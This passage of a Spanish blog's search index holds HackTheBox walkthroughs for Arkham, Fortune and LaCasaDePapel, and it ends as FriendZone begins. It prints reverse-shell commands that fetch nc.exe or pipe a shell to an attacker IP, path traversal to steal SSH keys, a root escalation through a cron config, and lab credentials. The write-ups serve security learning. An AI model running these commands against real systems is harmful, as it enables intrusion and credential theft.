C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 10.10.13.129 443   Obtenemos una shell inversa como Alfred y nuestra bandera User.txt.\nUSUARIOS - Arkham Podemos ver que existen otros dos usuarios Batman y Administrator.\nVemos que Batman pertenece al grupo de Administrators.\nUSER - BATMAN En el directorio C:\\Users\\alfred\\Downloads\\backups encontramos un archivo backup.zip, lo trasladamos a nuestra maquina con netcat.\nAl descomprimirlo nos muestra un archivo .ost de Microsoft Outlook, utilizamos readpst para leer el archivo de correos el cual nos extrajo los borradores (Drafts.mbox).\nPara lectura de Drafts.mbox utilizamos mutt.\n1  mutt -Rf Drafts.mbox   Encontramos una imagen de cmd con un comando que contiene un usuario y contraseña:\n1  net use G: \\\\10.10.10.10\\gotham /user:batman Zx^#QZX+T!123   Utilizamos powershell para cambiar al usuario(sesion) Batman con el siguiente comando:\n1  $username =\u0026#34;ARKHAM\\batman\u0026#34;;$password = convertto-securestring -AsPlainText -Force -String \u0026#34;Zx^#QZX+T!123\u0026#34;; $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password; New-PSSession -Credential $cred | Enter-PSSession   Exitosamente pudimos cambiar al usuario Batman pero no podemos listar los directorios y archivos.\nREVERSE SHELL - BATMAN Para obtener una shell inversa con el usuario Batman vamos a utilizar Invoke-Command para descargar netcat (nc.exe) en el directorio de Batman y ejecutar una shell inversa, el siguiente comando se ejecuta con el usuario alfred.\n1  $username = \u0026#39;ARKHAM\\batman\u0026#39;;$password = \u0026#39;Zx^#QZX+T!123\u0026#39;;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName ARKHAM -Command {powershell wget http://10.10.15.2:8081/nc.exe -o C:\\Users\\Batman\\Documents\\nc.exe; powershell C:\\Users\\Batman\\Documents\\nc.exe -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 10.10.15.2 445}   Obtenemos una shell y podemos ejecutar comandos, pero no podemos acceder a la carpeta de Administrator.\nROOT Por alguna razon el siguiente comando funciona para acceder a la carpeta de Administrator, y obtenemos nuestra bandera root.txt.\n1  cd \\\\10.10.10.130\\C$\\Users\\Administrator\\   ","description":"Arkham de HackTheBox con SO Windows, Encontramos un backup en SMB encriptado con binwalk obtuvimos archivos, uno de ellos es la configuracion de la \"applicacion\", mediante este ultimo explotamos una vulnerabilidad de deserializacion en java utilizando el codigo de Apache MyFaces junto con ysoserial, lo que nos dio acceso a la maquina. Para el movimiento lateral utilizamos powershell con credenciales de borradores de correo electronico dentro de un backup. Finalmente cambiando de recurso compartido localmente logramos acceder a la carpeta del administrador.","id":142,"section":"posts","tags":["smbclient","binwalk","responder","ysoserial","DNS exfil","java deserialization","readpst","mutt","powershell"],"title":"Hack The Box - Arkham","uri":"https://sckull.github.io/posts/arkham/"},{"content":"  Realizamos Command Injection en la pagina web lo que nos guió a certificados los cuales utilizamos para generar uno nuevo y acceder a una nueva pagina restringida, la que nos permitía generar claves SSH para Authpf, con este ultimo encontramos el puerto NFS que nos permitió obtener acceso por SSH. Finalmente encontramos y crackeamos un hash de una base de datos para escalar privilegios.\nInformacion de la Maquina    Nombre Fortune      OS Other   Puntos 50   Dificultad Insane   IP 10.10.10.127   Maker AuxSarge    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[8.1, 7.7, 4.3, 5.7, 2.3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[8, 9, 1, 9, 1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Al realizar un escaneo con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # Nmap 7.70 scan initiated Wed Mar 13 22:48:02 2019 as: nmap -sV -sC -A -o nmap.scan 10.10.10.127 Nmap scan report for 10.10.10.127 Host is up (0.17s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) | ssh-hostkey: | 2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA) | 256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA) |_ 256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519) 80/tcp open http OpenBSD httpd |_http-server-header: OpenBSD httpd |_http-title: Fortune 443/tcp open ssl/https? |_ssl-date: TLS randomness does not represent time No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.70%E=4%D=3/13%OT=22%CT=1%CU=40048%PV=Y%DS=2%DC=T%G=Y%TM=5C89893 OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=RD%CI=RI%TS=22)OPS(O OS:1=M54DNNSNW6NNT11%O2=M54DNNSNW6NNT11%O3=M54DNW6NNT11%O4=M54DNNSNW6NNT11% OS:O5=M54DNNSNW6NNT11%O6=M54DNNSNNT11)WIN(W1=4000%W2=4000%W3=4000%W4=4000%W OS:5=4000%W6=4000)ECN(R=Y%DF=Y%T=40%W=4000%O=M54DNNSNW6%CC=N%Q=)T1(R=Y%DF=Y OS:%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=S%F OS:=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=A%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y OS:%T=40%W=0%S=A%A=S%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=FF%IPL=38%UN=0%RI OS:PL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)   HTTPS Al visitar la pagina nos encontramos con lo siguiente, por lo que no podemos hacer nada por ahora.\nHTTP Con gobuster encontramos la siguiente ruta.\n1  /fortune (Status: 301)   Utilizamos firefox para ver las peticiones que hace cuando enviamos una solicitud a una de las opciones, en cada opcion si se hace una peticion este nos devuelve de manera aleatoria un mensaje.\nY encontramos que, al editar las peticiones (POST db=fortunes), encontramos que podemos ejecutar comandos (RCE):\nAl realizar una enumeracion de carpeta y archivos encontramos en la carpeta del usuario bob (/home/bob/) certificados que pueden pertenecen a la pagina web https.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  /home/bob ├── ca │ ├── certs │ │ └── ca.cert.pem │ ├── crl │ ├── index.txt │ ├── index.txt.attr │ ├── index.txt.old │ ├── intermediate │ │ ├── certs │ │ │ ├── ca-chain.cert.pem │ │ │ ├── fortune.htb.cert.pem │ │ │ └── intermediate.cert.pem │ │ ├── crl │ │ ├── crlnumber │ │ ├── csr │ │ │ ├── fortune.htb.csr.pem │ │ │ └── intermediate.csr.pem │ │ ├── index.txt │ │ ├── index.txt.attr │ │ ├── newcerts │ │ │ └── 1000.pem │ │ ├── openssl.cnf │ │ ├── private │ │ │ ├── fortune.htb.key.pem │ │ │ └── intermediate.key.pem │ │ ├── serial │ │ └── serial.old │ ├── newcerts │ │ └── 1000.pem │ ├── openssl.cnf │ ├── private [error opening dir] │ ├── serial │ └── serial.old └── dba └── authpf.sql   La razon por la cual no podamos acceder a la pagina https es porque no tenemos el certificado de la misma, esta es una grafica de como funciona un certificado.\ncertsuperior - Certificados\nOracle - certificados\nPara poder acceder a la pagina debemos de crear nuestro archivo pkc12 el cual contiene el certificado y la clave, copiamos a nuestra maquina local los archivos intermediate.cert.pem e intermediate.key.pem, utilizando openssl generamos el certificado con el siguiente comando:\nssl - Certificate File\nibm - Certificate\n1  openssl pkcs12 -export -out cert.p12 -in intermediate.cert.pem -inkey intermediate.key.pem -passin pass:root -passout pass:root   Obtenemos el certificado y lo importamos a nuestro navegador en las configuraciones de certificado.\nVisitamos la pagina en https y nos muestra lo siguiente:\nAl visitar la pagina /generate nos muestra una clave publica agregada al los archivos de autorizacion ssh de la maquina y una clave privada con la cual nos podemos conectar al mismo.\nNos conectamos al servicio ssh con la clave generada y el usuario nfsuser, nos muestra el siguiente mensaje, pero nuestra shell no es interactiva:\nAl revisar los procesos que corren en la maquina nos muestra un servicio de authpf:\nSegun la documentacion de openbsd sobre Authpf nos dice que \u0026ldquo;es un intérprete (shell) para pasarelas de autenticación. Una pasarela de autenticación es como una pasarela de red normal (también llamada enrutador), con la diferencia que \u0026ldquo;los usuarios se deben autenticar ante la pasarela\u0026rdquo; antes de que se permita que pase el tráfico a través de ésta\u0026rdquo;.\nopenbsd - authpf\nautphf - español\nLas reglas de authpf /etc/authpf/authpf.rules nos muestran que cualquier usuario ip ($user_ip) en este caso nfsuser le de paso o permiso en los protocolos tcp udp.\n1 2  ext_if = \u0026#34;em0\u0026#34; pass in quick on $ext_if inet proto { tcp udp } from $user_ip to ($ext_if) keep state   Sabiendo que tenemos acceso a los protocolos tcp y udp volvemos a hacer un escaneo de puertos y encontramos los siguientes puertos abiertos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-21 04:58 GMT Nmap scan report for 10.10.10.127 Host is up (0.18s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) 80/tcp open http OpenBSD httpd 111/tcp open rpcbind 2 (RPC #100000) 443/tcp open ssl/https? 2049/tcp open nfs 2-3 (RPC #100003) 8081/tcp open http OpenBSD httpd Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.31 seconds   Encontramos que hay un servicio rpcbind y nfs que estan corriendo en la maquina, escaneamos el servicio rpcbind:\nRPCBIND Encontramos que el servicio NFS esta corriendo tanto en tcp y udp, por lo que podemos montar los share name de la maquina localmente.\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@sckull:~/htb/fortune# rpcinfo -p 10.10.10.127 program vers proto port service 100000 2 tcp 111 portmapper 100000 2 udp 111 portmapper 100005 1 udp 694 mountd 100005 3 udp 694 mountd 100005 1 tcp 944 mountd 100005 3 tcp 944 mountd 100003 2 udp 2049 nfs 100003 3 udp 2049 nfs 100003 2 tcp 2049 nfs 100003 3 tcp 2049 nfs root@sckull:~/htb/fortune#   NFS Al revisar los puntos compartidos obtenemos que /home puede ser montado\n1 2 3 4  root@sckull:~/htb/fortune# showmount -e 10.10.10.127 Export list for 10.10.10.127: /home (everyone) root@sckull:~/htb/fortune#   ACCESO a /home Para acceder a la carpeta /home debemos montarlo localmente y asi poder acceder a las carpetas y archivos que se encuentran dentro.\n1 2 3 4  root@sckull:~/htb/fortune# mkdir tmp_nfs root@sckull:~/htb/fortune# mount -t nfs 10.10.10.127:/home /root/htb/fortune/tmp_nfs root@sckull:~/htb/fortune# ls tmp_nfs/ bob charlie nfsuser   Observamos que hay tres usuarios de los cuales bob ya conocemos su interior, mas no el de charlie y nfsuser:\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@sckull:~/htb/fortune# ls -lah tmp_nfs/nfsuser/ total 16K drwxr-xr-x 2 1002 1002 512 Nov 3 02:39 . drwxr-xr-x 5 root root 512 Nov 3 01:19 .. -rw-r--r-- 1 1002 1002 771 Oct 11 20:18 .cshrc -rw-r--r-- 1 1002 1002 101 Oct 11 20:18 .cvsrc -rw-r--r-- 1 1002 1002 359 Oct 11 20:18 .login -rw-r--r-- 1 1002 1002 175 Oct 11 20:18 .mailrc -rw-r--r-- 1 1002 1002 215 Oct 11 20:18 .profile -rw-r--r-- 1 1002 1002 87 Oct 11 20:18 .Xdefaults root@sckull:~/htb/fortune# ls -lah tmp_nfs/charlie/ ls: cannot open directory \u0026#39;tmp_nfs/charlie/\u0026#39;: Permission denied root@sckull:~/htb/fortune#   Podemos ver que a la carpeta del usuario charlie no tenemos acceso, para ello vamos a crear un usuario localmente y un grupo para poder acceder al interior, utilizamos stat para ver informacion de la carpeta, con lo cual vemos que /home/charlie tiene propiedades uid: 1000 y gid:1000.\n1 2 3 4 5 6 7 8 9  root@sckull:~/htb/fortune# stat tmp_nfs/charlie/ File: tmp_nfs/charlie/ Size: 512 Blocks: 4 IO Block: 32768 directory Device: 31h/49d\tInode: 27648 Links: 3 Access: (0750/drwxr-x---) Uid: ( 1000/ UNKNOWN) Gid: ( 1000/ UNKNOWN) Access: 2019-03-21 05:17:35.827314870 +0000 Modify: 2019-03-21 05:33:05.655948328 +0000 Change: 2019-03-21 05:33:05.655948328 +0000 Birth: -   Creamos un usuario y grupo local para charlie:\n1 2 3  root@kali:~# groupadd --gid 1000 charlie_group root@kali:~# useradd --uid 1000 --groups charlie_group charlie_user root@kali:~# sudo -u charlie_user ls -l tmp_nfs/charlie   Con ello logramos acceder y obtener tambien nuestra bandera user.txt.\nAhora que tenemos acceso a la carpeta de charlie podemos agregar nuestra clave ssh a authorized_keys para poder logearnos con el servicio ssh como charlie.\nDe la misma forma para el usuario bob:\nESCALACION DE PRIVILEGIOS Dentro de la carpeta charlie nos encontramos con un archivo mbox, que contiene un mensaje de bob para charlie.\nNos dice que bob cambio la contraseña para el usuario dba es la misma que la del usuario root, haciendo una enumeracion de carpetas y archivos nos encontramos un archivo pgadmin4.db que contiene tablas que le pertenecen a pgadmin3.4, utilizando sqlite db browser, dentro de este archivo encontramos una contraseña y usuario dba especificamente en la tabla de server, tambien una tabla que contiene usuario y contraseña de bob y charlie.\nRuta del archivo:\n1  /var/appsrv/pgadmin4/pgadmin4.db   Tambien encontramos la ruta donde se encuentran los documentos de pgadmin dentro del archivo pgadmin4.ini:\ndba\nbob y charlie\nUsuario ROOT En la ruta de pgadmin4 local (/usr/local/pgadmin4/pgadmin4-3.4/web/utils/), encontramos un archivo llamado crypto.py, en su interior encontramos funciones las cuales encriptan y desencriptan contraseñas (encrypt(), decrypt(), pad(), pqencryptpassword()), la funcion de encrypt() necesita un texto y una clave, la funcion decrypt() el texto encriptado (ciphertext) anteriormente con la funcion encrypt() y la clave, con estas dos funciones y la contraseña que se encuentra en la tabla de server del usuario dba, podemos intentar desencriptarla solo nos falta la clave (key).\nDentro de la base de datos (pgadmin4.db) encontramos algunas claves (tabla -\u0026gt; keys) que podriamos utilizar para la funcion decrypt(), de igual forma los usuarios (tabla -\u0026gt; users) y contraseñas (tabla -\u0026gt; users).\nLocalmente agregamos el siguiente codigo a nuestro archivo crypto.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  if __name__ == \u0026#39;__main__\u0026#39;: list_keys = [\u0026#39;root\u0026#39;,\u0026#39;operator\u0026#39;,\u0026#39;www\u0026#39;,\u0026#39;postgresql\u0026#39;,\u0026#39;pgadmin4\u0026#39;,\u0026#39;fortune\u0026#39;,\u0026#39;charlie\u0026#39;, \u0026#39;bob\u0026#39;,\u0026#39;nfsuser\u0026#39;,\u0026#39;authpf\u0026#39;,\u0026#39;admin\u0026#39;,\u0026#39;administrator\u0026#39;,\u0026#39;pgadmin3\u0026#39;,\u0026#39;Administrator\u0026#39;,\u0026#39;bob@fortune.htb\u0026#39;, \u0026#39;charlie@fortune.htb\u0026#39;,\u0026#39;user\u0026#39;,\u0026#39;saQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs=\u0026#39;, \u0026#39;R_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM=\u0026#39;,\u0026#39;qIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q=\u0026#39;, \u0026#39;dba\u0026#39;,\u0026#39;postgres\u0026#39;,\u0026#39;$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ\u0026#39;, \u0026#39;$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg\u0026#39;] pass_dba = \u0026#34;utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz\u0026#34; for key in list_keys: k = str(user) r = decrypt(pass_dba, k) print(k +\u0026#39; : \u0026#39; + r)   Esta porcion de codigo contiene una lista de las claves (keys) probables para la contraseña (pass_dba) del usuario dba que corresponde igualmente para el usuario root, dentro de las claves tambien encontramos usuarios, ya que una key podria ser o no el nombre de un usuario, de igual manera agregamos las contraseñas de la base de datos de los usuarios bob y charlie. En resumen agregamos a la lista todas las posibles claves que encontramos dentro de la maquina. Al correr nuestro script obtenemos el siguente resultado:\nNuestra contraseña para el usuario dba y para root es R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!, la clave que fue satisfactoria fue una contraseña en este caso la contraseña de bob que se encuentra en la base de datos. Asi obtenemos nuestra bandera root.txt.\n","description":"Realizamos Command Injection en la pagina web lo que nos guió a certificados los cuales utilizamos para generar uno nuevo y acceder a una nueva pagina restringida, la que nos permitía generar claves SSH para Authpf, con este ultimo encontramos el puerto NFS que nos permitió obtener acceso por SSH. Finalmente encontramos y crackeamos un hash de una base de datos para escalar privilegios.","id":143,"section":"posts","tags":["openssl","rpcinfo","nfs","showmount","authpf"],"title":"Hack The Box - Fortune","uri":"https://sckull.github.io/posts/fortune/"},{"content":"  LaCasaDePapel con tematica en la serie de Netflix, expone la consola de desarrollo Psy Shell por medio de la cual obtuvimos certificados para acceder a un area restringida. Escribimos nuestra clave publica en los archivos SSH para obtener acceso. Finalmente escalamos privilegios mediante un CronJob.\nInformacion de la Maquina    Nombre LaCasaDePapel      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.131   Maker thek    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7, 5, 6.1, 3.9, 5], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[8, 5, 8, 2, 5], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de todos los puertos tcp/udp.\n1 2 3 4 5 6 7 8 9 10  masscan -p1-65535,U:1-65535 10.10.10.131 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 443/tcp on 10.10.10.131 Discovered open port 22/tcp on 10.10.10.131 Discovered open port 80/tcp on 10.10.10.131 Discovered open port 21/tcp on 10.10.10.131   Escaneo de puertos encontrados con MASSCAN.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-03 00:48 BST Nmap scan report for 10.10.10.131 Host is up (0.22s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) | ssh-hostkey: | 2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA) | 256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA) |_ 256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519) 80/tcp open http Node.js Express framework |_http-title: La Casa De Papel 443/tcp open ssl/http Node.js Express framework | ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel | Not valid before: 2019-01-27T08:35:30 |_Not valid after: 2029-01-24T08:35:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | tls-nextprotoneg: | http/1.1 |_ http/1.0 Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds   Agregamos lacasadepapel.htb a nuestro archivo /etc/hosts.\nHTTPS Al visitar la pagina en https nos muestra un error de certificado.\nHTTP Al visitar la pagina nos muestra una imagen QR.\nFTP Encontramos ftp en su version vftpd 2.3.4 el cual tiene una vulnerabilidad de backdoor, utilizamos exploit escrito en python para ejecutar comandos, cuando lo ejecutamos nos muestra un mensaje de Psy Shell, intentamos conectarnos al puerto 6200, y encontramos una shell de Psysh,y con el comando dir la clase $tokyo.\nExpliting Vsftpd\nGithub - Exploit\nUtilizamos el comando \u0026lsquo;show $tokyo\u0026rsquo; para mostrar el codigo que en este se encuentra.\n1 2 3 4 5 6 7 8  class Tokyo { private function sign($caCert,$userCsr) { $caKey = file_get_contents(\u0026#39;/home/nairobi/ca.key\u0026#39;); $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, [\u0026#39;digest_alg\u0026#39;=\u0026gt;\u0026#39;sha256\u0026#39;]); openssl_x509_export($userCert, $userCertOut); return $userCertOut; } }   Al parecer es una clase que crea un certificado para tener acceso a la pagina en https, vamos a generar el nuestro utilizando la key (ca.key) que utiliza la funcion. Para leer este archiv utilizamos: file_get_contents(archivo).\nIBM - Certificate\nGithub - Certificate\ntecadmin - Certificate\nGeneramos nuestro certificado para firefox con los siguientes comandos:\n1  openssl req -key ca.key -new -x509 -days 365 -out lacasadepapelhtb.crt -subj \u0026#34;/C=US/ST=New York/L=Brooklyn/O= La Casa De Papel/CN=lacasadepapel.htb\u0026#34;   1  openssl pkcs12 -export -in lacasadepapelhtb.crt -inkey ca.key -out lacasadepapelhtb.p12   Importamos nuestro certificado a firefox y al visitar la pagina nos muestra lo siguiente:\nAl visitar SEASON-1 nos muestra una lista de videos en formato avi al visitar o dar click a uno de ellos nos descarga un archivo, vacio.\n01.avi\nhttps://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp Dicha url en su parte final (/U0VBU09OLTEvMDEuYXZp) esta codificada en base64, por lo que al decodificarla obtenemos el valor de SESEASON-1/01.avi, sabiendo esto podemos codificar ../../../../etc/passwd en base64 para observar que pasa si codificamos una ruta de un archivo para descargarla.\nAsi es como obtenemos el archivo /etc/passwd, ahora que sabemos como descargar archivos vamos a descargar el id_rsa (../.ssh/id_rsa) del usuario berlin y asi conectarnos mediante el servicio ssh.\nPor alguna razon el id_rsa del usuario berlin no funciona en si mismo, funciona con el usuario professor y dali. En el caso de dali debemos de agregar nuestra clave al archivo authorized_keys mediante PSYSH.\nUSUARIO DALI PSYSH Debugging Psysh\nUtilizando psysh en el puerto 6200 mediante telnet podemos leer y escribir archivos, en este caso vamos a leer el archivo /etc/passwd.\n$file = file_get_contents('/etc/passwd');echo $file; Al revisar dicho archivo vemos que el usuario dali tiene como shell psysh y su directorio principal es /home/dali.\netcpasswd format\nYa que sabemos que psysh es ejecutado por el usuario dali y tenemos acceso a su directorio principal, podemos generar y agregar nuestra id_rsa.pub a el archivo authorized_keys del usuario dali, para luego poder conectarnos por medio de ssh.\n1  $text = \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkleT1qRUUh9Qu7dT4UXLIfsQc4qkEvKax/+7T3l24zhIJm3R2KOEbfOYdtRBwVOyoE8YfXp7YjPV/lFa7W5MkOoXACk3bl1rYS8GrRr/uYMabrponpZTFPMRl90lBArarRPMFtEKtrhoTw+QBSdKa8Be5AOCp5I+Ky8hF/Pf7uSgThtYD7/LLFIpW6YJJu06M890xah1TwuXkgqzPfPWtaVOYvS1smnSYbjflNtMQ0pHSHBTElXx9r9VmFXIslBkST1iHbQT5ZzWHvKxFQkAEoLyAqdvIkgJ7zKbcEwz9bQO4dPVe18D4srDGUnoG+v+/YNexvwmHaCP/V5cUdupv root@sckull\u0026#34;;$filename = \u0026#34;/home/dali/.ssh/authorized_keys\u0026#34;;$fh = fopen($filename, \u0026#34;a\u0026#34;);fwrite($fh, $text);fclose($fh);   Escribimos y verificamos.\nAhora nos conectamos con la clave de \u0026lsquo;berlin\u0026rsquo;.\nUSUARIO PROFESSOR - SSH Para el usuario professor utilizamos la misma clave para conectarnos y obtenemos una sesion ssh.\nUSER - FLAG Al enumerar las carpetas de los usuarios encontramos nuestra bandera user.txt en la carpeta de berlin, para obtenernuestra bandera encodeamos la direccion en base64 y la descargamos de la misma forma que la clave de berlin.\nPRIVILEGE ESCALATION Utilizamos pspy64 para ver los crons que se ejecutan.\nEncontramos un proceso que se ejecuta que utiliza node y un archivo memcached.js.\nEl archivo memcached.js se encuentra en nuestra carpeta principal (/home/professor) pero no tenemos permisos, tambien se encuentra otro archivo llamadao memcached.ini que contiene un comando que ejecuta node con el archivo memcached.js.\nHacemos una prueba de ping con el usuario root a nuestra ip, agregamos lo siguiente a memcached.ini, pero primero renombramos el archivo anterior a otro ya que no tenemos permisos, creamos un nuevo archivo con el mismo nombre y agregamos lo siguiente.\nY obtenemos la respuesta de la maquina.\nPara obtener una shell inversa creamos un archivo con nuestra shell inversa dentro, y agregamos su ejecucion dentro del archivo memcached.ini.\nbatman.sh\n1  echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.12.119 7878 \u0026gt;/tmp/f\u0026#34; \u0026gt; /tmp/batman.sh   1 2 3  memcached.ini [program:memcached] command = sudo -u root sh /tmp/batman.sh   ","description":"LaCasaDePapel con tematica en la serie de Netflix, expone la consola de desarrollo Psy Shell por medio de la cual obtuvimos certificados para acceder a un area restringida. Escribimos nuestra clave publica en los archivos SSH para obtener acceso. Finalmente escalamos privilegios mediante un CronJob.","id":144,"section":"posts","tags":["ftp","openssl","cron","psy shell"],"title":"Hack The Box - LaCasaDePapel","uri":"https://sckull.github.io/posts/lacasadepapel/"},{"content":"  FriendZone es una maquina CTF Like donde encontramos una vulnerabilidad LFI en uno de los subdominios donde obtuvimos acceso en conjunto con un recurso de SAMBA. Encontramos en un archivo de configuracion una contraseña para el siguiente usuario para finalmente realizar Python Library Hijacking para escalar privilegios.\nInformacion de la Maquina    Nombre FriendZone      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.123   Maker askar    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[8.3, 4.4, 4.1, 5.9, 5.6], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, 